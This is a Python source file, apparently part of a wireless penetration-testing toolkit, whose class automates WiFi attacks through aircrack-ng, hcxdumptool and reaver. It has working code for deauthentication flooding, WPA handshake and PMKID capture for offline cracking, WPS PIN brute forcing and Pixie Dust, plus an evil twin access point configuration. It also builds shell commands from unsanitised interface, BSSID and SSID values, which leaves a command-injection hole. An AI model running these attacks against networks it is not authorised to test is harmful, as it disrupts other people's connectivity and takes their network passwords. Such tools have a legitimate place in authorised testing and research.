"""
Wireless Attack Module
Handles WiFi attacks: EAPOL capture, deauth, monitoring, PMKID, evil twin, etc.
"""

import subprocess
import time
import os
import re
from typing import Dict, List, Callable
from datetime import datetime


class WirelessAttacker:
    """Wireless penetration testing functionality"""

    def __init__(self):
        self.is_running = False
        self.monitor_interface = None
        self.captured_handshakes = []

    def enable_monitor_mode(self, interface: str) -> str:
        """
        Enable monitor mode on wireless interface

        Args:
            interface: Wireless interface name

        Returns:
            Monitor mode interface name
        """
        try:
            # Kill interfering processes
            subprocess.run("airmon-ng check kill", shell=True,
                          capture_output=True)

            # Start monitor mode
            result = subprocess.run(f"airmon-ng start {interface}",
                                   shell=True, capture_output=True, text=True)

            # Parse monitor interface name (usually wlan0mon)
            if 'monitor mode enabled' in result.stdout.lower():
                # Try to extract monitor interface name
                match = re.search(r'monitor mode (?:enabled|vif enabled) on (\w+)',
                                result.stdout, re.IGNORECASE)
                if match:
                    self.monitor_interface = match.group(1)
                else:
                    self.monitor_interface = f"{interface}mon"

                return self.monitor_interface
            else:
                # Fallback: try with iw
                subprocess.run(f"ip link set {interface} down", shell=True)
                subprocess.run(f"iw {interface} set monitor control", shell=True)
                subprocess.run(f"ip link set {interface} up", shell=True)
                self.monitor_interface = interface
                return interface

        except Exception as e:
            print(f"Error enabling monitor mode: {e}")
            return None

    def disable_monitor_mode(self, interface: str) -> bool:
        """Disable monitor mode and restore managed mode"""
        try:
            subprocess.run(f"airmon-ng stop {interface}", shell=True,
                          capture_output=True)
            return True
        except Exception:
            return False

    def scan_aps(self, interface: str, callback: Callable = None,
                 duration: int = 30) -> Dict:
        """
        Scan for wireless access points

        Args:
            interface: Monitor mode interface
            callback: Status callback
            duration: Scan duration in seconds

        Returns:
            Dictionary with discovered APs
        """
        if callback:
            callback(f"[WIFI] Scanning for access points on {interface}...")

        output_file = f"/tmp/airodump_scan_{int(time.time())}"

        try:
            # Start airodump-ng
            cmd = f"timeout {duration} airodump-ng {interface} -w {output_file} --output-format csv"

            subprocess.run(cmd, shell=True, capture_output=True)

            # Parse CSV output
            aps = self._parse_airodump_csv(f"{output_file}-01.csv")

            if callback:
                callback(f"[WIFI] Found {len(aps)} access points")

            # Cleanup
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try:
                    os.remove(f"{output_file}{ext}")
                except:
                    pass

            return {
                'aps': aps,
                'count': len(aps),
                'interface': interface
            }

        except Exception as e:
            if callback:
                callback(f"[ERROR] AP scan failed: {e}")
            return {'aps': [], 'error': str(e)}

    def _parse_airodump_csv(self, csv_file: str) -> List[Dict]:
        """Parse airodump-ng CSV output"""
        aps = []

        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()

            # Find the AP section (before station section)
            ap_section_started = False
            for line in lines:
                if 'BSSID' in line and 'Power' in line:
                    ap_section_started = True
                    continue

                if ap_section_started:
                    if 'Station MAC' in line:  # End of AP section
                        break

                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14 and parts[0]:  # Valid AP line
                        try:
                            ap = {
                                'bssid': parts[0],
                                'channel': parts[3],
                                'speed': parts[4],
                                'privacy': parts[5],
                                'cipher': parts[6],
                                'auth': parts[7],
                                'power': parts[8],
                                'beacons': parts[9],
                                'data': parts[10],
                                'ssid': parts[13].strip()
                            }

                            # Convert power to signal quality
                            try:
                                power_dbm = int(ap['power'])
                                ap['signal'] = f"{power_dbm} dBm"
                            except:
                                ap['signal'] = ap['power']

                            aps.append(ap)
                        except Exception:
                            continue

        except Exception as e:
            print(f"Error parsing CSV: {e}")

        return aps

    def capture_handshake(self, interface: str, bssid: str, channel: str,
                         pmkid_mode: bool = False, callback: Callable = None,
                         progress_callback: Callable = None) -> Dict:
        """
        Capture WPA/WPA2 EAPOL handshake

        Args:
            interface: Monitor mode interface
            bssid: Target BSSID (MAC address)
            channel: WiFi channel
            pmkid_mode: Use PMKID attack (clientless)
            callback: Status callback
            progress_callback: Progress callback

        Returns:
            Dictionary with capture results
        """
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"/tmp/handshake_{timestamp}"

        results = {
            'success': False,
            'bssid': bssid,
            'channel': channel,
            'file': None
        }

        try:
            if callback:
                callback(f"[EAPOL] Targeting {bssid} on channel {channel}")

            # Set channel
            subprocess.run(f"iwconfig {interface} channel {channel}",
                          shell=True, capture_output=True)

            if progress_callback:
                progress_callback(10)

            if pmkid_mode:
                # PMKID attack (clientless)
                if callback:
                    callback("[PMKID] Starting clientless PMKID capture")

                cmd = f"timeout 120 hcxdumptool -i {interface} -o {output_file}.pcapng --enable_status=1"
                subprocess.run(cmd, shell=True)

                # Convert to hashcat format
                if os.path.exists(f"{output_file}.pcapng"):
                    subprocess.run(f"hcxpcapngtool -o {output_file}.22000 {output_file}.pcapng",
                                  shell=True, capture_output=True)

                    if os.path.exists(f"{output_file}.22000"):
                        results['success'] = True
                        results['file'] = f"{output_file}.22000"
                        results['type'] = 'PMKID'
                        if callback:
                            callback(f"[SUCCESS] PMKID captured: {results['file']}")

            else:
                # Traditional handshake capture
                if callback:
                    callback("[EAPOL] Starting handshake capture (use deauth to force reconnection)")

                # Start airodump-ng focused on target
                cmd = (f"timeout 180 airodump-ng {interface} --bssid {bssid} "
                      f"--channel {channel} -w {output_file}")

                # Run in background
                process = subprocess.Popen(cmd, shell=True,
                                          stdout=subprocess.PIPE,
                                          stderr=subprocess.PIPE)

                if progress_callback:
                    progress_callback(30)

                # Wait a bit for capture to start
                time.sleep(3)

                # Perform deauth to force handshake
                if callback:
                    callback("[DEAUTH] Sending deauth packets to force handshake")

                deauth_cmd = f"timeout 10 aireplay-ng --deauth 10 -a {bssid} {interface}"
                subprocess.run(deauth_cmd, shell=True, capture_output=True)

                if progress_callback:
                    progress_callback(60)

                # Wait for capture to complete
                process.wait()

                if progress_callback:
                    progress_callback(90)

                # Check if handshake was captured
                cap_file = f"{output_file}-01.cap"
                if os.path.exists(cap_file):
                    # Verify handshake with aircrack-ng
                    verify_cmd = f"aircrack-ng {cap_file}"
                    verify_result = subprocess.run(verify_cmd, shell=True,
                                                   capture_output=True, text=True)

                    if 'handshake' in verify_result.stdout.lower():
                        # Convert to hashcat format
                        hashcat_file = f"{output_file}.22000"
                        subprocess.run(f"hcxpcapngtool -o {hashcat_file} {cap_file}",
                                      shell=True, capture_output=True)

                        results['success'] = True
                        results['file'] = hashcat_file
                        results['cap_file'] = cap_file
                        results['type'] = 'EAPOL'

                        if callback:
                            callback(f"[SUCCESS] EAPOL handshake captured: {hashcat_file}")
                    else:
                        if callback:
                            callback("[FAILED] No handshake detected in capture")

            if progress_callback:
                progress_callback(100)

        except Exception as e:
            results['error'] = str(e)
            if callback:
                callback(f"[ERROR] {str(e)}")

        if results['success']:
            self.captured_handshakes.append(results)

        return results

    def deauth_attack(self, interface: str, bssid: str, client: str = None,
                     count: int = 0, callback: Callable = None) -> Dict:
        """
        Deauthentication attack

        Args:
            interface: Monitor mode interface
            bssid: Target AP BSSID
            client: Specific client to deauth (None for broadcast)
            count: Number of deauth packets (0 = continuous)
            callback: Status callback

        Returns:
            Attack results
        """
        if callback:
            callback(f"[DEAUTH] Starting deauth attack on {bssid}")

        try:
            if client:
                cmd = f"aireplay-ng --deauth {count if count > 0 else 0} -a {bssid} -c {client} {interface}"
                if callback:
                    callback(f"[DEAUTH] Targeting client {client}")
            else:
                cmd = f"aireplay-ng --deauth {count if count > 0 else 0} -a {bssid} {interface}"
                if callback:
                    callback("[DEAUTH] Broadcasting to all clients")

            # Run attack
            if count > 0:
                result = subprocess.run(cmd, shell=True, capture_output=True,
                                       text=True, timeout=30)
            else:
                # Continuous mode - run for 60 seconds
                subprocess.run(f"timeout 60 {cmd}", shell=True,
                             capture_output=True)

            if callback:
                callback("[DEAUTH] Attack completed")

            return {
                'success': True,
                'bssid': bssid,
                'client': client,
                'count': count
            }

        except Exception as e:
            if callback:
                callback(f"[ERROR] {str(e)}")
            return {'success': False, 'error': str(e)}

    def evil_twin_attack(self, interface: str, target_ssid: str,
                        callback: Callable = None) -> Dict:
        """
        Evil Twin AP attack

        Args:
            interface: Wireless interface
            target_ssid: SSID to impersonate
            callback: Status callback

        Returns:
            Attack results
        """
        if callback:
            callback(f"[EVIL TWIN] Creating fake AP: {target_ssid}")

        try:
            # Create hostapd config
            config_file = "/tmp/evil_twin.conf"
            config = f"""
interface={interface}
driver=nl80211
ssid={target_ssid}
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
"""

            with open(config_file, 'w') as f:
                f.write(config)

            if callback:
                callback("[EVIL TWIN] Starting fake AP with hostapd")

            # Start hostapd
            cmd = f"hostapd {config_file}"
            # This would run in background
            # process = subprocess.Popen(cmd, shell=True)

            if callback:
                callback("[EVIL TWIN] Fake AP is running")

            return {
                'success': True,
                'ssid': target_ssid,
                'message': 'Evil twin AP started'
            }

        except Exception as e:
            if callback:
                callback(f"[ERROR] {str(e)}")
            return {'success': False, 'error': str(e)}

    def wps_attack(self, interface: str, bssid: str, callback: Callable = None) -> Dict:
        """
        WPS PIN attack using reaver

        Args:
            interface: Monitor mode interface
            bssid: Target BSSID
            callback: Status callback

        Returns:
            Attack results
        """
        if callback:
            callback(f"[WPS] Starting WPS attack on {bssid}")

        try:
            # Check if WPS is enabled
            check_cmd = f"wash -i {interface} -C"
            check_result = subprocess.run(check_cmd, shell=True,
                                         capture_output=True, text=True,
                                         timeout=30)

            if bssid in check_result.stdout:
                if callback:
                    callback("[WPS] Target has WPS enabled, starting PIN attack")

                # Start reaver
                cmd = f"timeout 600 reaver -i {interface} -b {bssid} -vv"
                result = subprocess.run(cmd, shell=True, capture_output=True,
                                       text=True)

                # Check for PIN in output
                if 'WPS PIN:' in result.stdout:
                    pin_match = re.search(r'WPS PIN: (\d+)', result.stdout)
                    psk_match = re.search(r'WPA PSK: (.+)', result.stdout)

                    if pin_match:
                        pin = pin_match.group(1)
                        psk = psk_match.group(1) if psk_match else None

                        if callback:
                            callback(f"[SUCCESS] WPS PIN: {pin}")
                            if psk:
                                callback(f"[SUCCESS] WPA PSK: {psk}")

                        return {
                            'success': True,
                            'pin': pin,
                            'psk': psk
                        }

            else:
                if callback:
                    callback("[WPS] WPS not enabled on target")
                return {'success': False, 'message': 'WPS not enabled'}

        except Exception as e:
            if callback:
                callback(f"[ERROR] {str(e)}")
            return {'success': False, 'error': str(e)}

    def pixie_dust_attack(self, interface: str, bssid: str,
                         callback: Callable = None) -> Dict:
        """
        WPS Pixie Dust attack

        Args:
            interface: Monitor mode interface
            bssid: Target BSSID
            callback: Status callback

        Returns:
            Attack results
        """
        if callback:
            callback(f"[PIXIE] Starting Pixie Dust attack on {bssid}")

        try:
            cmd = f"timeout 120 reaver -i {interface} -b {bssid} -K 1 -vv"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if 'WPS PIN:' in result.stdout:
                pin_match = re.search(r'WPS PIN: (\d+)', result.stdout)
                if pin_match:
                    pin = pin_match.group(1)
                    if callback:
                        callback(f"[SUCCESS] Pixie Dust successful! PIN: {pin}")
                    return {'success': True, 'pin': pin}

            if callback:
                callback("[PIXIE] Attack failed or not vulnerable")
            return {'success': False}

        except Exception as e:
            if callback:
                callback(f"[ERROR] {str(e)}")
            return {'success': False, 'error': str(e)}

    def packet_injection_test(self, interface: str, callback: Callable = None) -> Dict:
        """
        Test packet injection capability

        Args:
            interface: Monitor mode interface
            callback: Status callback

        Returns:
            Test results
        """
        if callback:
            callback(f"[TEST] Testing packet injection on {interface}")

        try:
            cmd = f"aireplay-ng --test {interface}"
            result = subprocess.run(cmd, shell=True, capture_output=True,
                                   text=True, timeout=30)

            if 'Injection is working!' in result.stdout:
                if callback:
                    callback("[TEST] Packet injection is working!")
                return {'success': True, 'injection_working': True}
            else:
                if callback:
                    callback("[TEST] Packet injection may not be working")
                return {'success': False, 'injection_working': False}

        except Exception as e:
            if callback:
                callback(f"[ERROR] {str(e)}")
            return {'success': False, 'error': str(e)}

    def stop(self):
        """Stop wireless attacks"""
        self.is_running = False
        # Kill any running aircrack-ng tools
        subprocess.run("killall airodump-ng aireplay-ng airmon-ng reaver wash",
                      shell=True, capture_output=True)
